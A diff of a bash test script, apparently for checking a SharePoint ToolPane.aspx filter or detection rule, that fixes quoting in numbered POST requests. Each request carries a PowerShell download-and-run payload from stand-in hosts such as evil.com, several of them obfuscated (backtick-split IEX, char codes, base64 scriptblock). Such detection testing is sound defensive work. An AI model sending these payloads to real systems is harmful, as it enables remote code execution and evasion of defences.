@@ -51,12 +51,12 @@ $CURL "$BASE_URL/_layouts/15/xxx.aspx"
 echo "14. POST PowerShell IEX (Invoke-Expression)"
 $CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
   -H "Content-Type: text/plain" \
-  --data 'powershell -Command "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/shell.ps1\')"'
+  --data 'powershell -Command "IEX(New-Object Net.WebClient).DownloadString(\"http://evil.com/shell.ps1\")"'
 
 echo "15. POST PowerShell IEX offuscato (I\`E\`X)"
 $CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
   -H "Content-Type: text/plain" \
-  --data 'powershell -Command "I`E`X(New-Object Net.WebClient).DownloadString(\'http://evil.com/shell.ps1\')"'
+  --data "powershell -Command \"I\`E\`X(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\""
 
 echo "16. POST base64 puro (senza EncodedCommand)"
 $CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
@@ -66,12 +66,12 @@ $CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
 echo "17. POST PowerShell pattern Invoke-WebRequest"
 $CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
   -H "Content-Type: text/plain" \
-  --data "powershell -Command 'Invoke-WebRequest -Uri http://malicious.com -OutFile C:\\mal.exe'"
+  --data 'powershell -Command "Invoke-WebRequest -Uri http://malicious.com -OutFile C:\\mal.exe"'
 
 echo "18. POST PowerShell pattern New-Object Net.WebClient"
 $CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
   -H "Content-Type: text/plain" \
-  --data "powershell -Command '(New-Object Net.WebClient).DownloadFile(\'http://malicious.com/file.exe\',\'C:\\file.exe\')'"
+  --data 'powershell -Command "(New-Object Net.WebClient).DownloadFile(\"http://malicious.com/file.exe\",\"C:\\file.exe\")"'
 
 echo "19. POST PowerShell IEX concatenato ('I'+'EX')"
 $CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
@@ -81,7 +81,7 @@ $CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
 echo "20. POST PowerShell char codes ([char]73+[char]69+[char]88)"
 $CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
   -H "Content-Type: text/plain" \
-  --data "powershell -Command \"\$b=[char]73+[char]69+[char]88; iex(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\""
+  --data 'powershell -Command "$b=[char]73+[char]69+[char]88; iex(New-Object Net.WebClient).DownloadString(\"http://evil.com/shell.ps1\")"'
 
 echo "21. POST PowerShell variabile IEX ( 4a='IEX'; &$a)"
 $CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
@@ -96,14 +96,14 @@ $CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
 echo "23. POST PowerShell via cmd.exe wrapper"
 $CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
   -H "Content-Type: text/plain" \
-  --data "cmd.exe /c powershell -Command \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\""
+  --data 'cmd.exe /c powershell -Command "IEX(New-Object Net.WebClient).DownloadString(\"http://evil.com/shell.ps1\")"'
 
 echo "24. POST PowerShell pipeline (IEX (Get-Content ...))"
 $CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
   -H "Content-Type: text/plain" \
-  --data "powershell -Command \"IEX (Get-Content C:\\temp\\payload.ps1)\""
+  --data 'powershell -Command "IEX (Get-Content C:\\temp\\payload.ps1)"'
 
 echo "25. POST PowerShell Invoke-Obfuscation artifact"
 $CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
   -H "Content-Type: text/plain" \
-  --data "powershell -Command \"&([scriptblock]::Create((('JABXAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=')))\""
+  --data "powershell -Command \"&([scriptblock]::Create((('JABXAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA='))))\""
